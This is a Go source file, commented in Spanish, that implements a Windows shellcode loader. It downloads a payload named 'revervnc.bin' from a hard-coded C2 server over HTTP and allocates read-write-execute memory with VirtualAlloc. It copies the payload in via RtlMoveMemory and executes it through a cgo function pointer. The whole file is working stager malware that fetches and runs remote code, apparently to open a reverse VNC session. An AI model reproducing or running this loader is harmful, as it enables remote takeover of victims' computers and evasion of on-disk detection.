package main

//(5) Codigo en C para convertir la region de memoria en funcion
import(
/*
typedef void (*exec_mem)();

void run_shellcode(exec_mem shellcode){
	return shellcode();
}
*/
	"C"
	"golang.org/x/sys/windows"
	"os"
	"net/http"
	"io/ioutil"
	"unsafe"
)

func error_handler(e error){
	if e != nil{
		os.Exit(1)
	}
}

//(1) Funcion para descargar el shellcode desde el C2,
//retorna los opcodes en un slice (array) de bytes
func get_shellcode() []byte{
	var opcodes []byte

	if shellfile, err := http.Get("http://192.168.1.20:8080/revervnc.bin");
   	shellfile.StatusCode == 200{
		error_handler(err)

		opcodes, err = ioutil.ReadAll(shellfile.Body)
		error_handler(err)
	}

	return opcodes
}

//(2) Se reserva la memoria con la longitud del shellcode,
//con permisos de ejecucion, lectura y escritura
//se retorna la direccion de memoria reservada
func set_malloc(dwsize int) uintptr{
	alloctype	:= 0x00001000 | 0x00002000
	flprotect	:= 0x40

	kernel32 := windows.NewLazyDLL("kernel32.dll")
	mem_alloc := kernel32.NewProc("VirtualAlloc")
	mem_addr, _, _ := mem_alloc.Call(0x0,					//direccion de inicio
									 uintptr(dwsize),		//longitud de la shell
									 uintptr(alloctype),	//tipo de reserva: MEM_COMMIT | MEM_RESERV
									 uintptr(flprotect),	//permisos: r,w,x (0x40)
	)

	return mem_addr
	
}

//(3) Se inyecta el shellcode en la direccion de memoria
//reservada
func inject_mem(start_addr uintptr, shell []byte){
	ntdll := windows.NewLazyDLL("ntdll.dll")
	move_mem := ntdll.NewProc("RtlMoveMemory")
	move_mem.Call(start_addr,							//region destino
				  uintptr(unsafe.Pointer(&shell[0])),	//region origen
				  uintptr(len(shell)),					//longitudde la shell
	)
}


func main(){
	shellcode := get_shellcode()
	entry_point := set_malloc(len(shellcode))
	inject_mem(entry_point, shellcode)

	//(4) Se modifica la region de memoria para que sea del
	//funcion de C y se ejecuta el shellcode
	code_func := (C.exec_mem)(unsafe.Pointer(entry_point))
	C.run_shellcode(code_func)
}
